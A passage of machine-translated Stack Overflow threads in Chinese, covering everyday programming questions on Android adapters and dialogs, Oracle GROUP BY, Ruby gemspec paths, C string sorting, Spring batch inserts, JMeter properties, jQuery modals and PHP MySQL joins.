> 时间：2013-02-07T09:37:16.193

我对 NopCommerce 1.9 也有同样的问题，因为它无法组织任何类型的数据孤岛。

简单的选项是配置一个 FTP 帐户，以便用户在确实理解 XML 的情况下可以上传 XML。

另一种方法是添加您自己的管理页面。对于简单的 XML 设置，您不需要更改数据库。

1.  首先添加一个新设置，例如“XML.HomepageFlash”，您可以将其预设为一些有效的 XML 配置。请注意，您可以通过管理区域或直接数据库编辑添加条目。

2.  将新页面添加到“/admin”文件夹并构建您的配置表单（如果您只需要一个纯文本编辑器，那么这很容易）。显然，通过 Nop SettingsManager 实例将其写入以加载并保存到您的新设置。您应该从现有的管理页面派生此页面以匹配样式。

3.  更新管理站点地图文件以包含您的新页面。

4.  最后，您需要将 XML 设置通过管道传输到 flash 控件，因此编写一个简单的页面来加载数据并将其作为 XML 文件写入（确保将内容类型更改为 text/xml）。

最后的想法 - 如果您打算让网站管理员自己编辑 xml，那么您可以跳过第 2 步和第 3 步，让他们在配置的设置区域中编辑 xml。

我希望这能给你一些建议。

标记

# android - Android-IndexOutOfBound 异常

> ID：11427908
> 
> 赞同：0
> 
> 时间：2012-07-11T07:44:53.943
> 
> 标签：android

我已经为 gridView 编写了一个适配器来显示从 Internet 下载的照片，部分代码如下所示

```
public class ImageAdapter extends BaseAdapter {
    int mGalleryItemBackground;
    private Context mContext;

    public ArrayList<Drawable> drawablesFromUrl = new ArrayList<Drawable>();

    public ImageAdapter(Context c) {
        mContext = c;
    }

    public void addItem(Drawable item) {
        drawablesFromUrl.add(item);
    }

    public int getCount() {
        return drawablesFromUrl.size();
    }

    public Drawable getItem(int position) {
        return drawablesFromUrl.get(position);
    }

    public long getItemId(int position) {
        return position;
    }

    public View getView(int position, View convertView, ViewGroup parent) {
        if (convertView == null) {  // if it's not recycled, initialize some attributes
            imageView = new ImageView(mContext);
            imageView.setLayoutParams(new GridView.LayoutParams(85, 85));
            imageView.setScaleType(ImageView.ScaleType.CENTER_CROP);
            imageView.setPadding(8, 8, 8, 8);
        } else {
            imageView = (ImageView) convertView;
        }

        imageView.setImageDrawable(drawablesFromUrl.get(position));
        return imageView;

    }//View getView

}//class ImageAdapter 
```

它工作正常，下载的照片存储在 ArrayList "drawablesFromUrl.get(position)"

现在我已经写了一个意图来打开另一个活动来在 imagView 中显示一张单独的照片，部分代码列表如下：

```
SitePhotoGallery pg = new SitePhotoGallery();
ImageAdapter imageAdapter = pg.new ImageAdapter(this);

Drawable dPhoto=imageAdapter.drawablesFromUrl.get(position); //(ERROR in this line)
BitmapDrawable bPhoto  = (BitmapDrawable) dPhoto;
Bitmap snoop = bPhoto.getBitmap();

//Bitmap snoop = BitmapFactory.decodeResource(getResources(),imageAdapter.mThumbIds[position]);
img.setImageBitmap(snoop);  
img.setMaxZoom(4f);        
setContentView(img); 
```

它提示错误：

> 07-11 15:22:11.458: E/AndroidRuntime(12856): java.lang.RuntimeException: 无法启动活动
> ComponentInfo{com.android.mcsis/com.android.mcsis.SitePhotoFullScreen}: java.lang.IndexOutOfBoundsException: 无效索引 0，大小为 0

我猜arraylist`imageAdapter.drawablesFromUrl.get(position);`是空的。有什么我做错了吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T07:53:34.280

ImageAdapter imageAdapter = pg.new ImageAdapter(this);

我认为您正在创建 ImageAdapter 内部类的新实例。所以之前存储的arraylist位图数据将丢失，因为它曾经属于不同的对象。

如果您想在整个应用程序中保持某些数据处于活动状态，请尝试使用 Application 类对象，而不是使用此方法。它非常简单和漂亮。并且可以通过 context.getApplicationContext() 获取它的实例。

# api - 如何将 youtube 收藏夹导出为 URL 列表？

> ID：11427909
> 
> 赞同：1
> 
> 时间：2012-07-11T07:44:58.370
> 
> 标签：api, youtube

您将如何导出 youtube 收藏夹，如果可能的话，也导入？

作为开发人员，是否有我们可以与之交互的 API？如果没有，你能想出一个解决方法吗？

我更喜欢在 PHP 中执行此操作，但任何其他语言也可以。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-11T16:46:02.360

是的，有一个可用的 API。我没有检查过，但假设可以像访问任何其他播放列表一样访问用户的收藏夹。文档在这里：

[https://developers.google.com/youtube/2.0/reference](https://developers.google.com/youtube/2.0/reference)

Zend 框架中有一个用于与所有 Google 服务交互的包，它有几个 YouTube 特定模块。在上面的文档中已经讨论过了。就个人而言，我觉得它对于许多任务来说有点太重了，但是当我需要快速启动并运行某些东西时，请使用它。

# macros - ERStudio 宏字符串拆分

> ID：11427913
> 
> 赞同：0
> 
> 时间：2012-07-11T07:45:07.140
> 
> 标签：macros

我正在为 ER Studio 9.1.1 开发一个宏，当我使用拆分功能时，它会突出显示，因为它是语言的一部分。宏是用 SAX Basic (v6) 编写的，根据 SAX Basic 手册，应该支持拆分，但是这段代码给了我错误：

```
Dim strArray As String
Dim data As String
data = "one, two, three"
strArray = Split(data, ", ") 
```

错误是“期望现有的标量变量”。

所以我的问题是，是否支持拆分以及标量变量是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-12T07:34:31.967

我发现，ER Studio 宏不支持拆分功能。如果您需要拆分功能，则必须编写自定义代码。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-11T15:24:33.367

一个潜在可能：

你有一个函数或 sub 已经调用了 split。要对此进行测试，请查看是否`VBA.Split(`有效。如果是这样，那么您需要重命名自己的函数，或者始终使用 vba.split

还有另一个错误：
由于您将 strArray 定义为字符串，因此它将在拆分时失败，因为它无法将数组放入单个变量中。要么删除定义，所以你所拥有的就是`Dim strArray`，或者将它定义为一个数组`Dim strArray() As String`

# java - 关于oracle sql group by 'not a group by expression'

> ID：11427920
> 
> 赞同：0
> 
> 时间：2012-07-11T07:45:27.567
> 
> 标签：java, sql, oracle10g

Oracle 10g，sql 抛出异常：“not a group by expression”

```
select count(*)
        from (
            select h.personal_info_id pid,h.hbsag hbsag,h.sgpt sgpt,MAX(h.date_reported)
            from health_checkup_info h
            inner join personal_info p on h.personal_info_id = p.id
            where
                h.deleted = 0
                and h.date_reported is not null
                and h.hbsag in(1,2)
                and p.deleted = 0

            group by h.personal_info_id
        ) t where t.hbsag=1 and t.sgpt>=20 
```

然后，我更改了 'group by' 参数，添加 'h.hbsag' 'h.sgpt'，例如：

```
group by h.personal_info_id,h.hbsag,h.sgpt 
```

但结果不正确。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-12T08:17:54.583

Thanks everyone,now I have already solved the problem.The query is:

```
select count(*)
        from (
            select h.personal_info_id pid,h.hbsag,ROW_NUMBER() OVER (partition by h.personal_info_id order by h.date_reported desc) r
            from health_checkup_info h
            inner join personal_info p on h.personal_info_id = p.id
            where
                h.deleted = 0
                and h.date_reported is not null
                and h.hbsag in(1,2)
                and p.deleted = 0

        ) t where t.hbsag=2 and r=1 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-11T07:52:02.113

其Oracle的行为，除了聚合函数之外的所有选定列都必须分组。

```
select count(*)
        from (
            select h.personal_info_id pid,h.hbsag hbsag,h.sgpt sgpt,MAX(h.date_reported)
            from health_checkup_info h
            inner join personal_info p on h.personal_info_id = p.id
            where
                h.deleted = 0
                and h.date_reported is not null
                and h.hbsag in(1,2)
                and p.deleted = 0

            group by h.personal_info_id,h.hbsag,h.sgpt
        ) t 
```

## 更新：

由于您只是使用`count`，需要什么来获取其他列？尝试这个..

```
select count(*)
        from (
            select h.personal_info_id pid,MAX(h.date_reported)
            from health_checkup_info h
            inner join personal_info p on h.personal_info_id = p.id
            where
                h.deleted = 0
                and h.date_reported is not null
                and h.hbsag in(1,2)
                and p.deleted = 0

            group by h.personal_info_id
        ) t; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-11T07:49:01.307

您应该添加不属于聚合函数的所有列。尝试这个。

```
select count(*) from 
( 
    select h.personal_info_id pid,h.hbsag hbsag,h.sgpt sgpt,MAX(h.date_reported) 
    from health_checkup_info h inner join personal_info p on h.personal_info_id = p.id 
    where h.deleted = 0 and h.date_reported is not null and h.hbsag in(1,2) and p.deleted = 0
    group by h.personal_info_id ,h.hbsag ,h.sgpt 
) t 
```

# ruby-on-rails - 如何在 gemspec 文件中指定依赖 gem 的路径？

> ID：11427922
> 
> 赞同：15
> 
> 时间：2012-07-11T07:45:46.980
> 
> 标签：ruby-on-rails, ruby-on-rails-3, rubygems

我创建了一个 gem(X) 并且它没有发布。现在我正在创建另一个 gem，它将 gem X 添加为这样的依赖项：-

```
s.add_dependency "X" 
```

在 gemspec 文件中。

由于 gem(X) 不在 ruby​​gem 或 git 或 ruby​​forge 上，所以 bundle install 命令会抛出错误：

> 找不到宝石 X**

我认为指定 X 的路径可以解决问题，但是如何呢？

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2014-04-08T22:50:47.550

我想我看到了@bor1s 在关于 git 引用的 SO 帖子中所指的内容。

该`gemspec`文件是关于发布 gem 的依赖项。您`Gemfile`通常通过调用来设置本地开发环境`gemspec`。

在你的情况下你`gemspec`应该有这个

```
s.add_dependency "X" 
```

然后你`Gemfile`会看起来像这样（确保本地引用在`gemspec`调用之后）：

```
source "http://www.rubygems.org"
gemspec
gem "X", :path => "/Users/vikram/source/X" 
```

* * *

引用 Yahuda Katz[关于 gemspec 和 Bundler 的博客文章](http://yehudakatz.com/2010/12/16/clarifying-the-roles-of-the-gemspec-and-gemfile/)

> 如果您发现需要针对尚未发布的 gem 进行开发（例如，Rails 经常针对未发布的 Rack、Arel 或 Mail gem 进行开发），您可以在 Gemfile 中添加单独的行来告诉打包程序在哪里可以找到宝石。它仍将使用 .gemspec 中列出的依赖项进行依赖项解析，但它现在知道在 gem 开发期间在哪里找到依赖项。

```
source "http://www.rubygems.org"

gemspec

# if the .gemspec in this git repo doesn't match the version required by this
# gem's .gemspec, bundler will print an error
gem "rack", :git => "git://github.com/rack/rack.git" 
```

> 您不希望在 .gemspec 中包含此信息，在开发中的 gem 也已发布后，该信息最终将发布到 Rubygems。同样，这使整个系统更具弹性，因为它不依赖于瞬态外部 URL。这些信息纯粹是用于在开发过程中设置完整环境的东西，这需要一定的精度。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-11T08:09:12.507

我想你可以在这里找到你的问题的答案： [Gem dependency](https://stackoverflow.com/questions/6499410/ruby-gemspec-dependency-is-possible-have-a-git-branch-dependency)

希望它会有所帮助。

# java - 抽象工厂作为一种策略？

> ID：11427924
> 
> 赞同：0
> 
> 时间：2012-07-11T07:45:58.367
> 
> 标签：java, oop, design-patterns, factory-pattern, strategy-pattern

我想知道是否可以将抽象工厂用作策略，例如嵌套两种模式并将**工厂类**也称为策略。

我提供了一个例子来说明我的问题。该类`ShoppingMall`将是上下文类，而`PizzaStore`将是有问题的抽象工厂，在这种情况下我也将其视为一种策略。

```
// interface of context class, mostly a wrapper
// uses 3 different strategies
interface ShoppingMall
{
    PizzaStore GetPizzaStore();
    ParkingLot GetParkingLot();
    Adverts GetAdverts();

    void CustomerArrives();
}

// abstract factory & strategy interface?
interface PizzaStore 
{
    Pizza CreatePizzaCheese();
    Pizza CreatePizzaVeggie();
    Pizza CreatePizzaClam();
    Pizza CreatePizzaPepperoni();
}

// strategy interface
interface ParkingLot 
{
    void Pay();
}

// strategy interface   
interface Adverts
{
    void CreateSpam();
}

class PizzaStoreChicago implements PizzaStore {}
class PizzaStoreNY implements PizzaStore {}
class PizzaStoreObjectVille  implements PizzaStore {}

class ParkingLotBig   implements ParkingLot {}
class ParkingLotSmall implements ParkingLot {}
class ParkingLotCheap implements ParkingLot {}

class AdvertsAnnoying implements Adverts {}
class AdvertsBoring implements Adverts {}
class AdvertsStupid implements Adverts {}

class ShoppingMallObjectVille implements ShoppingMall {}
class ShoppingMallJavaRanch implements ShoppingMall {}
class ShoppingMallAverage implements ShoppingMall {}
class ShoppingMallOther implements ShoppingMall {} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-11T07:53:38.133

是的，组合一个以上的设计模式来解决问题并没有什么坏处。从您的设计中，我可以看到以下问题：

该接口`PizzaStore`不应该包含所有这些创建方法，因为它没有真正意义（您正在强制所有比萨店实现所有这些方法，如果比萨店只生产素食比萨怎么办？）。策略模式表示您必须以多种不同的方式实现一种方法或抽象算法。这将使您能够灵活地在运行时切换算法和策略。

“PizzaStore”应该看起来像这样：

```
interface PizzaStore 
{
    Pizza CreatePizza();
} 
```

然后所有`PizzaStore`实现都应该实现一个`CreatePizza`方法，该方法将返回一个`Pizza`应该是抽象类或接口的方法。的实现/扩展`Pizza`应该是：`PizzaCheese`, `PizzaVeggie`, `PizzaClam`,`PizzaPepperoni`

# android - 为什么自定义对话框按钮在android中不起作用

> ID：11427925
> 
> 赞同：0
> 
> 时间：2012-07-11T07:46:05.063
> 
> 标签：android, dialog

我们创建了两个自定义对话框，一个是关于，另一个是警报。当我当时在自定义对话框中交替选择时，按钮不起作用。

示例代码

```
AlertDialog.Builder builder;
Context mContext;
LayoutInflater inflater;
View layout;
Dialog dialog;
@Override
protected Dialog onCreateDialog( int id ) 
{ 
    switch ( id ) 
    {
        case 1:
            builder = null;
            mContext = this;
            inflater = ( LayoutInflater ) mContext.getSystemService( LAYOUT_INFLATER_SERVICE );
            layout = inflater.inflate( R.layout.alert_page, ( ViewGroup ) findViewById( R.id.alert_Root ) );
            Button alertUser = ( Button ) layout.findViewById( R.id.alert_Submit );
            alertUser.setOnClickListener( new View.OnClickListener()
            {
                public void onClick( View v )
                {
                    try
                    {
                        dialog.dismiss();
                    }
                    catch ( Exception e ) 
                    {
                        Toast.makeText( getBaseContext(), e.getMessage(), Toast.LENGTH_SHORT ).show();
                    }
                }
            });
            builder = new AlertDialog.Builder( mContext );
            builder.setView( layout );
            dialog = builder.create();
            dialog.show();
            break;

        case 2:
            builder = null;
            mContext = this;
            inflater = ( LayoutInflater ) mContext.getSystemService( LAYOUT_INFLATER_SERVICE );
            layout = inflater.inflate( R.layout.about_page, ( ViewGroup ) findViewById( R.id.about_Root ) );
            Button aboutUser = ( Button ) layout.findViewById( R.id.about_Submit );
            aboutUser.setOnClickListener( new View.OnClickListener()
            {
                public void onClick( View v )
                {
                    Log.e("About","About");
                    try
                    {
                        Log.e("About1","About");
                        dialog.dismiss();
                    }
                    catch ( Exception e ) 
                    {
                        Log.e("About","About12");
                        Toast.makeText( getBaseContext(), e.getMessage(), Toast.LENGTH_SHORT ).show();
                    }
                }
            });
            builder = new AlertDialog.Builder( mContext );
            builder.setView( layout );
            dialog = builder.create();
            dialog.show();
            break;
    }
    return dialog;
} 
```

例如我使用两个按钮。第一个按钮被调用`case 1`，第二个按钮被调用`case 2`。

我选择了 First button to access `case 1`，然后选择了自定义对话框`alertUser`按钮`successfully Exit the dialog box`。

我立即选择了 Second button to access `case 2`，然后选择 custom dialog box `aboutUser`button `successfully Exit the dialog box`。

之后我立即选择了 First button to access `case 1`，然后选择 custom dialog box `alertUser`button `Now the dialog box does not exist (button is now not working)`。

我在哪里弄错了代码。这个问题怎么解决的。

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T07:54:54.447

这样做：

```
Button button1=(Button) findViewById(R.id.btn1);
Button button2=(Button) findViewById(R.id.btn2);

 button1.setOnClickListener(this);
 button2.setOnClickListener(this); 
```

通过 OnClickListener 实现您的 Activity 并添加您将作为 onClick 获得的未实现方法。

```
public void onClick(View v) {
switch(v.getId()){
        case R.id.btn1:
            //write code
            break;
        case R.id.btn2:
            //write code
            break;
        }
} 
```

在按钮的点击事件上做任何你想做的事情。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-11T10:55:20.377

您将对话框称为`showDialog(int)`. 删除此`dialog.show();`行`onCreateDialog`

并调用`dismissDialog(int)`以关闭对话框而不是`dialog.dismiss();`

# php - 比较循环中文本框的值并突出显示最小值

> ID：11427927
> 
> 赞同：2
> 
> 时间：2012-07-11T07:46:13.063
> 
> 标签：php, jquery, textbox, while-loop, minimum

我需要大家的帮助..

**实际情况是：** 这是更新今天产品价格的模块，并且循环创建了七个文本框

```
<input type="text" id="<?="rate2".$i?>" name="<?="rate2".$i?>" size="5" /> 
```

（$i 是循环的增量变量）我也已经得到了 abc 率（标准价格）。

**现在的问题是：** 每当用户在 1 TBX 上输入值时，它应该将 this.value 与 abc 速率进行比较，如果 this.value 较低，则整行的文本颜色应为红色，依此类推。最后，它还应该突出最低的。

请尽快帮助我提前谢谢...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T07:52:08.613

使用 jQuery 可能是这样的：

```
<input type="text" id="<?="rate2".$i?>" name="<?="rate2".$i?>" size="5" 
onkeypress="if( parseInt($(this).val()) < abc )$(this).css('background-color','red')"/> 
```

在 Prototype 处添加一个函数：

```
Array.prototype.min = function() {
    var r = this[0];
    this.forEach(function(v,i,a){if (v<r) r=v;});
    return r;
};

var items = [];
$('input:test').each(function(){
   items.push($(this).val());
});

var lowest = items.min;

$("input:text[value='"+min+"']").css('background-color','blue'); 
```

# java - 在 Spring + mysql 中使用 ACID 属性进行批量更新

> ID：11427931
> 
> 赞同：1
> 
> 时间：2012-07-11T07:46:30.280
> 
> 标签：java, mysql, spring, jdbctemplate

目前我们的应用程序使用 Spring、SimpleJdbcTemplate 和 MySQL。

使用的数据源是 org.apache.commons.dbcp.BasicDataSource，其 url 属性为“rewriteBatchedStatements=true”。

在使用 进行批量插入期间，输入批次`SimpleJdbcTemplate.batchUpdate(List<Object[]>)`中将存在重复记录（基于我们正在插入的表的主键）。

在重复记录的情况下是否可以

> 1) 插入所有非重复记录并得到关于成功插入次数的响应？

或者

> 2）完全回滚batchInsert，不应该插入记录？

我们能够使用 mysql 的“INSERT IGNORE”部分实现第一个要求。但是`SimpleJdbcTemplate.batchUpdate()`返回更新的每条记录。（无法仅捕获插入的记录计数而忽略重复项）

为了实现第二个要求，我们必须关闭“rewriteBatchedStatements”。但是这个参数经过性能测试后已经微调了。所以我们不能把它设置为“假”。

在第一行中提到的我们使用的组件的约束范围内，是否有可能实现上述两种情况之一？

我是spring和jdbc世界的新手，所以详细的解释会更好地帮助我们。谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T09:29:27.820

> 1) 插入所有非重复记录并得到关于成功插入次数的响应？

=> 你可以，插入所有非重复记录，然后得到响应。`batchUpdate()`返回`int[]`即整数数组，表示受批处理中每次更新影响的行数（插入/更新）。

> 2）完全回滚batchInsert不应该插入记录？

=> 由于 batchInsert 将在单个事务中，因此将插入所有记录或不插入任何记录。如果事务被提交，所有记录都将被插入。`@Transactional`如果发生任何异常，如果您使用 Spring 事务管理（使用注解或`spring aop based tx advice`），事务将自动回滚。在这里确保，您设置了`BasicDataSource.defaultAutoCommit = false`.

# c - 函数使数组为空

> ID：11427935
> 
> 赞同：1
> 
> 时间：2012-07-11T07:46:42.513
> 
> 标签：c

我有以下代码：

```
#include <stdio.h>

void insertion_sort(char[], int);
void swap(char*, char*);

int main() {
    char s[] = "hello world";
    puts(s);
    insertion_sort(s, sizeof(s)/sizeof(char));
    puts("done\n");
    puts(s);
    return 0;
}

void swap(char* a, char* b) {
    char tmp = *a;
    *a = *b;
    *b = tmp; 
}

void insertion_sort(char s[], int n)
{
    int i,j;
    /* counters */
    for (i=1; i<n; i++) {
        j=i;
        while ((j>0) && (s[j] < s[j-1])) {
            swap(&s[j],&s[j-1]);
            j = j-1;
        }
        printf("%s\n", s);
    }
} 
```

问题是，在`insertion_sort()`函数调用之后，它`s`变为空 -`puts(s)`什么也不打印。

请指教。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-07-11T07:49:49.027

改变：

```
insertion_sort(s, sizeof(s)/sizeof(char)); 
```

至：

```
insertion_sort(s, strlen(s)); 
```

否则，您将在您的排序中包含`'\0'`终止符。`s[]`

请注意，您将需要一个额外的标题才能进行`strlen`更改：

```
#include <stdio.h> 
```

至：

```
#include <stdio.h>    // printf etc
#include <string.h>   // strlen etc 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-11T07:52:23.393

问题是您传递给的长度`insertion_sort`包括终止`\0`字符，它恰好具有 value `0`，因此在排序中它被放置为数组的第一个元素。这就是为什么您的最后`puts()`一个字符什么都不打印的原因 - 因为第一个字符现在是“字符串的结尾”。

我建议您计算字符串的大小，使用`strlen()`它将返回字符串的长度，不包括终止字符。或者，如果您想按照自己的方式进行操作，请考虑终止字符并将其从总长度中减去。

# asp.net - 如何分析我的生产 Web 应用程序？

> ID：11427944
> 
> 赞同：1
> 
> 时间：2012-07-11T07:47:33.223
> 
> 标签：asp.net, mongodb, mono, profiling, mod-mono

我有一个博客。最近，我注意到一些性能问题。索引页面的等待时间大约为 400 毫秒。我认为这是相当高的。当我第一次部署它时（功能较少，但仍然如此），我记得索引加载时间大约为 80 毫秒。

现在我将对其进行分析，但问题是这只发生在我的生产环境中。在我的测试环境中，索引页面只需要 10ms。

如何分析我的生产应用程序？我在带有 MongoDB 的 Arch Linux 上使用 Apache+mono+mod_mono。我有一个类似的测试环境，除了我使用 xsp。

我不确定去哪里看：我的代码、Apache 的配置还是 MongoDB？如何分析我的生产服务器以找出为什么它比我的开发环境慢得多？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T08:14:16.463

很难在没有细节的情况下具体，但这里有一个一般指南的镜头：

首先，我建议使用类似[Firebug](http://getfirebug.com/) for Firefox 的东西——在其他浏览器中也有类似的东西，但这是我处理这类事情的旧工具。启用它并获得瀑布图的网络面板视图，该视图将向您显示页面上正在加载的每个对象的列表（您可能需要刷新） - 它还将有一个蓝色显示渲染事件（当页面变为可见的）。

瀑布应该让页面的慢部分非常明显，并且有了这些信息，您可以进入下一阶段 - 找出特定部分慢的原因。

如果插件不是你的东西，或者你怀疑它可能是你的机器本地的东西导致了问题，那么看看：[http ://www.webpagetest.org/](http://www.webpagetest.org/)

这将使您能够从不同的位置、不同的浏览器、速度等进行远程测试，并为您提供类似的详细结果。

如果是获取静态文件，请查看网络问题，Apache 是一个原因。如果它是动态生成的，那么看看 Apache、ASP、mongodb 等。

对于 Apache，访问日志所说的索引页面的响应时间是多少？假设 Apache 2 或更新版本，请确保您已`%D`（`%T`如果您愿意）被记录，以便您可以查看以所需详细信息级别提供页面（从 Apache 角度）所花费的时间。有关这方面的更多信息，请查看[LogFormat 指令](http://httpd.apache.org/docs/2.0/mod/mod_log_config.html#logformat)。

我无法在 ASP/Mono 方面提供帮助，这不是我的事，但在各个点添加调试语句以跟踪索引页面生成（假设它是动态生成的）将是一种非常标准的方法。

对于数据库，默认情况下，MongoDB 仅记录耗时 >100 毫秒的“慢”查询 - 如果您试图通过日志跟踪低于 100 毫秒的响应时间问题，则需要对其进行调整，否则您可能会得到很少。可以这样做：

```
> db.setProfilingLevel(0,20) // leave profiling off, slow threshold=20ms 
```

您还可以将其调整为 mongod 进程的启动参数（--slowms）。可以在此处找到有关分析的更多信息，这也可能会有所帮助，但会产生开销：

[http://www.mongodb.org/display/DOCS/Database+Profiler](http://www.mongodb.org/display/DOCS/Database+Profiler)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-11T08:09:31.260

我建议你看看 Sam Saffrons [Mini Profiler](http://miniprofiler.com/)。如果您在您的站点中使用它，它允许您在生产环境中打开分析。

通过在您的代码中添加足够的工具，您应该能够确定哪个位正在花费时间，然后将您的精力集中在那里。

# android - android-manifest 中的路径问题？

> ID：11427947
> 
> 赞同：0
> 
> 时间：2012-07-11T07:47:39.810
> 
> 标签：android, path, android-manifest

我正在扩展应用程序。在另一个测试中，所有东西都在同一个包中，一切都很顺利。现在，我确实有多个包并且应用程序崩溃了。我想，我想念清单中的路径？

```
 <application
    android:name=".MyInheritedApplication" 
    android:icon="@drawable/ic_launcher"
    android:label="@string/app_name"
    android:theme="@style/AppTheme" > 
```

任何提示表示赞赏！

谢谢，马库斯

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T07:57:55.827

确保您`package`的 -tag 中的 -attribute`manifest`设置正确。

例子

```
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.demo.android"
    ... >

</manifest 
```

每个`application`人都有自己的-`name`属性，将使用它`package`来建立自己的路径。

# jmeter - 覆盖 jmeter.properties

> ID：11427949
> 
> 赞同：4
> 
> 时间：2012-07-11T07:47:44.530
> 
> 标签：jmeter

是否可以在不关闭并重新启动 JMeter 的情况下重新读取 jmeter.properties？

也许有任何额外的课程会触发这个过程？

有时我需要玩一个属性的值，每次都重启 JMeter 很不方便，所以我想自动化这个过程。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-11T08:35:04.993

无需从文件中重新读取 jmeter 属性 - jmeter 具有足够的内置功能来读取/设置属性值。
至少以下内容：

*   jmeter[函数](http://jmeter.apache.org/usermanual/functions.html)： [_setProperty *()*](http://jmeter.apache.org/usermanual/functions.html#__setProperty)*，* [_property()](http://jmeter.apache.org/usermanual/functions.html#__property) , [__P](http://jmeter.apache.org/usermanual/functions.html#__P) ;
*   [props - JMeterProperties (class java.util.Properties)](http://jmeter.apache.org/usermanual/component_reference.html#BeanShell_Sampler) - 从 beanshell 代码访问；
*   [属性展示](http://jmeter.apache.org/usermanual/component_reference.html#Property_Display)。

另请查看以下内容以获取更多信息和示例：

*   [使用 JMeter 属性](http://jmeter-tips.blogspot.com/2010/01/tip-4-using-jmeter-properties.html)
*   [如何将 javascript 值设置为 JMeter 属性](http://jmeter.512774.n5.nabble.com/How-to-set-a-javascript-value-as-a-JMeter-property-td5577158.html)
*   [杰米特维基](http://wiki.apache.org/jmeter/JMeterFAQ#How_do_I_pass_parameters_into_my_Test_scripts.3F_I_want_to_be_able_to_use_the_same_script_to_test_with_different_numbers_of_threads_and_loops.2C_and_I_don.27t_want_to_have_to_change_the_script_each_time)

# javascript - 简单的模态和 Javascript 调用

> ID：11427952
> 
> 赞同：0
> 
> 时间：2012-07-11T07:47:58.617
> 
> 标签：javascript, jquery

我创建了一个简单的模态弹出对话框，如果你点击它就可以正常工作

```
 <a href='#' class='confirm'>Demo</a> 
```

但是我如何在 Javascript 中调用这个“确认”css 类。我努力了...

```
 <script language="JavaScript" type="text/JavaScript">
       $(".confirm").click();
       ** Also tried this to but no good... **
       document.getElementsByTagName('body')[0].className = 'confirm';
    </script> 
```

但是没有用。我敢肯定这很容易做到，但似乎无法做到。

谢谢，

弗兰克·G。

****** *****这是我正在使用的脚本***** ** *** ** *** ****** SimpleModal Confirm Modal 对话框**

 **```
 <!-- Page styles -->
    <link type='text/css' href='css/demo.css' rel='stylesheet' media='screen' />

    <!-- Confirm CSS files -->
    <link type='text/css' href='css/confirm.css' rel='stylesheet' media='screen' />

    <!-- JS files are loaded at the bottom of the page -->
    </head>
    <body>
    <div id='container'>
<div id='logo'>
    <h1>Simple<span>Modal</span></h1>
    <span class='title'>A Modal Dialog Framework Plugin for jQuery</span>
</div>
<div id='content'>
    <div id='confirm-dialog'>
        <h3>Confirm Override</h3>
        <p>A modal dialog override of the JavaScript confirm function. Demonstrates the use of the <code>onShow</code> callback as well as how to display a modal dialog confirmation instead of the default JavaScript confirm dialog.</p>
        <input type='button' name='confirm' class='confirm' value='Demo'/> or <a href='#' class='confirm'>Demo</a>
    </div>

    <!-- modal content -->
    <div id='confirm'>
        <div class='header'><span>Confirm 123</span></div>
        <div class='message'></div>
        <div class='buttons'>
            <div class='no simplemodal-close'>No</div><div class='yes'>Yes</div>
        </div>
    </div>
    <!-- preload the images -->
    <div style='display:none'>
        <img src='img/confirm/header.gif' alt='' />
        <img src='img/confirm/button.gif' alt='' />
    </div>
</div>
    </div>

    <!-- Load JavaScript files -->
    <script type='text/javascript' src='js/jquery.js'></script>
    <script type='text/javascript' src='js/jquery.simplemodal.js'></script>
    <script type='text/javascript' src='js/confirm.js'></script>

    <script type="text/javascript">
  $('.confirm').dialog({modal:true});
      $('.confirm').modal();
  $(".confirm").click();

    $(document).ready(function(){
   $('.confirm').dialog({modal:true});
       $('.confirm').modal();
   $(".confirm").click();
     });​

    </script>

    </body>
    </html> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T08:00:45.227

maybe you can try this jquery solution:

```
$("style[type=text/css]").text('@import url("*.css");'); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-11T08:10:07.183

要在页面加载时调用它，只需在 document ready 中调用它

```
$(document).ready(function(){
    $('#modal_div_id').modal(); // Id would be better (#confirm)
});​ 
```

这将在页面加载时调用它。确保您在页面上只有一个`class`名为`confirm`.

[**文档。**](http://www.ericmmartin.com/projects/simplemodal/)

[**这里有一个小提琴**](http://jsfiddle.net/2SxmE/1/)。**

# php - 如何选择数据库并使用 JOIN 与 MySQL PHP 数据库

> ID：11427953
> 
> 赞同：0
> 
> 时间：2012-07-11T07:48:02.003
> 
> 标签：php, mysql, html

我正在尝试运行此函数但无法使其工作，我做错了什么（输出显示我的 fetch 数组 arg 无效）？

```
$link = mysql_connect('localhost', 'over_app', 'password');
if (!$link) {
die('Could not connect: ' . mysql_error());
}

$result = mysql_query("SELECT Pic.PicID FROM Pics.Pic Pic LEFT JOIN SeenPics.Seen Seen ON Pic.PicID = Seen.PicID");
if (!$result) {
die('Invalid query: ' . mysql_error());
}

while($row = mysql_fetch_array($result)) { echo "Your Pic ID: $row['PicID']"; } 
```

**注意**表`Pic`在`Pics`数据库中，`Seen`表在`SeenPics`数据库中

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T07:50:44.117

`mysql_query`返回一个布尔值`false`是查询失败.. 这样做

```
$result = mysql_query("SELECT Pic.PicID FROM Pic LEFT JOIN Seen ON Pic.PicID = Seen.PicID");
if (!$result) {
    die('Invalid query: ' . mysql_error());
}
